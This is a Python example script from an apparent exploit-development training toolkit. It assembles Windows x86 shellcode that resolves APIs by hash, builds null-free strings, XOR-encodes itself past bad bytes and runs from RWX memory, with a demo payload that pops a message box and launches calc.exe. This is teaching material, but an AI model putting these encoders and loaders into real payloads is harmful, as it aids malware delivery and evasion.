#!/usr/bin/env -S uv run
"""
Example 04 — Custom function resolution with build_resolve_block().

Sometimes you need functions beyond the standard reverse/bind shell set.
This example resolves arbitrary functions by hash, then writes custom ASM
that calls them.  It demonstrates the toolkit's lower-level building blocks:

  - custom_code()          — PEB walk + find_function + user-specified functions
  - build_resolve_block()  — generates the push/call/mov triples for one DLL
  - build_load_and_resolve()— LoadLibraryA + resolve for a second DLL
  - SlotAllocator          — tracks which [ebp+N] slot holds which pointer
  - stack_string_pushes()  — null-free push sequence for arbitrary strings

The payload here: resolve WinExec + MessageBoxA, call MessageBoxA first
then WinExec("calc.exe").  Two DLLs, two custom calls.

Usage:
    uv run Examples/04_custom_functions.py --asm
    uv run Examples/04_custom_functions.py --hex
    uv run Examples/04_custom_functions.py --hashes
    uv run Examples/04_custom_functions.py          (execute on Windows)
"""
import argparse
import ctypes
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Tools.shellcode_x86_win import (
    assemble,
    ror_hash,
    stack_string_pushes,
    SlotAllocator,
)
from Tools.shellcode_x86_win.assembler import check_bad_chars
from Tools.shellcode_x86_win.builders import (
    _PROLOGUE,
    _FIND_KERNEL32,
    _FIND_FUNCTION_THUNK,
    _find_function_asm,
    build_resolve_block,
    build_load_and_resolve,
)

ALGO = "ror"
ROT  = 13

# Functions we need from kernel32
KERNEL32_FUNCS = ["LoadLibraryA", "WinExec", "TerminateProcess"]

# Functions we need from user32 (second DLL)
USER32_FUNCS = ["MessageBoxA"]


def build_asm():
    slots = SlotAllocator()

    # 1. Core blocks: prologue, PEB walk, find_function trampoline + routine
    core = "\n".join([
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(ALGO, ROT),
    ])

    # 2. Resolve kernel32 functions
    k32_block = build_resolve_block(
        KERNEL32_FUNCS, ALGO, ROT, slots,
        label="resolve_kernel32",
    )

    # 3. Load user32.dll and resolve MessageBoxA
    u32_block = build_load_and_resolve(
        "user32.dll", USER32_FUNCS, ALGO, ROT, slots,
    )

    # 4. Custom payload: MessageBoxA then WinExec("calc.exe")
    #
    # MessageBoxA(hWnd, lpText, lpCaption, uType)
    # "OSED\0" → 4f 53 45 44 00 — push null then push the 4 chars as one dword
    # "calc.exe\0" — null-free via negation trick
    #
    msgbox_slot  = slots.slot("MessageBoxA")
    winexec_slot = slots.slot("WinExec")
    terminate_slot = slots.slot("TerminateProcess")

    payload = f"""\
call_messagebox:
    ; Build "OSED\\0" on the stack as caption
    xor   eax, eax
    push  eax                        ; null terminator (separate dword, no embedded null)
    push  0x4445534f                 ; "OSED" little-endian
    mov   edi, esp                   ; EDI = &"OSED\\0"

    ; Use caption as text too (degenerate but null-free)
    xor   eax, eax
    push  eax                        ; uType = MB_OK
    push  edi                        ; lpCaption = "OSED"
    push  edi                        ; lpText    = "OSED"
    push  eax                        ; hWnd      = NULL
    call  dword ptr [ebp+{hex(msgbox_slot)}]       ; MessageBoxA

call_winexec:
    ; "calc.exe\\0" — null-free negation:
    ;   "exe\\0" = 65 78 65 00 → 0x00657865 — has null in high byte
    ;   neg(0x00657865) = 0xff9a879b → no nulls → neg at runtime gives original
    xor   eax, eax
    mov   eax, 0xff9a879b
    neg   eax                        ; EAX = 0x00657865 = "exe\\0"
    push  eax
    push  0x2e636c61                 ; "alc." → stack: "calc.exe\\0"
    push  esp                        ; lpCmdLine
    xor   eax, eax
    inc   eax                        ; uCmdShow = SW_SHOWNORMAL
    push  eax
    call  dword ptr [ebp+{hex(winexec_slot)}]       ; WinExec("calc.exe", 1)

exit:
    xor   eax, eax
    push  eax
    push  0xffffffff
    call  dword ptr [ebp+{hex(terminate_slot)}]    ; TerminateProcess
"""

    asm = "\n".join([core, k32_block, u32_block, payload])
    return asm, slots


def xor_encode(sc, bad_chars):
    bad = set(bad_chars)
    for k in range(1, 256):
        if k in bad:
            continue
        encoded = bytes(b ^ k for b in sc)
        if not any(b in bad for b in encoded):
            stub = (
                f"decoder:\n    jmp  get_sc\ngot_sc:\n    pop  edi\n"
                f"    mov  ecx, {hex(len(encoded))}\ndecode_loop:\n"
                f"    xor  byte ptr [edi + ecx - 1], {hex(k)}\n"
                f"    loop decode_loop\n    jmp  edi\nget_sc:\n    call got_sc\n"
            )
            stub_sc, _ = assemble(stub)
            return bytes(stub_sc) + encoded, k
    raise ValueError("No single-byte XOR key avoids all bad bytes")


def build(bad: bytes = b""):
    asm, slots = build_asm()
    sc, count = assemble(asm)
    sc = bytes(sc)
    print(f"[*] Assembled: {count} instructions, {len(sc)} bytes")

    hits = check_bad_chars(sc, bad) if bad else []
    if hits:
        print(f"[*] {len(hits)} bad byte(s) — XOR encoding")
        sc, key = xor_encode(sc, bad)
        print(f"[*] Encoded: {len(sc)} bytes  key=0x{key:02x}")
    return sc, asm, slots


def run(sc: bytes) -> None:
    buf = bytearray(sc)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(buf)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        (ctypes.c_char * len(buf)).from_buffer(buf),
        ctypes.c_int(len(buf)))
    print(f"[*] Shellcode at {hex(ptr)}")
    input("Press ENTER to execute...")
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main() -> None:
    ap = argparse.ArgumentParser(description="Example 04: Custom function resolution")
    ap.add_argument("--asm",    action="store_true", help="Print generated ASM")
    ap.add_argument("--slots",  action="store_true", help="Print EBP slot table")
    ap.add_argument("--hashes", action="store_true", help="Print all hashes")
    ap.add_argument("--hex",    action="store_true", help="Print shellcode hex")
    ap.add_argument("--bad",    default="",          help="Bad bytes hex e.g. 000a0d")
    ap.add_argument("--run",    action="store_true", help="Execute on Windows")
    args = ap.parse_args()

    if args.hashes:
        all_funcs = KERNEL32_FUNCS + USER32_FUNCS
        print(f"ROR-{ROT} hashes:")
        for fn in all_funcs:
            print(f"  {hex(ror_hash(fn, ROT))}  {fn}")
        return

    asm, slots = build_asm()

    if args.asm:
        print(asm)
        return

    if args.slots:
        print("EBP slot layout:")
        for name, off in sorted(slots.table().items(), key=lambda x: x[1]):
            print(f"  [ebp+{hex(off)}]  {name}")
        return

    bad = bytes.fromhex(args.bad) if args.bad else b""

    try:
        sc, _, _ = build(bad)
    except SystemExit:
        print("[!] keystone-engine not installed — use --asm to view source")
        return

    if args.hex or (not args.run):
        print(f'\n# {len(sc)} bytes')
        print('"' + "".join(f"\\x{b:02x}" for b in sc) + '"')

    if args.run:
        if sys.platform != "win32":
            print("[!] --run requires Windows")
            return
        run(sc)


if __name__ == "__main__":
    main()
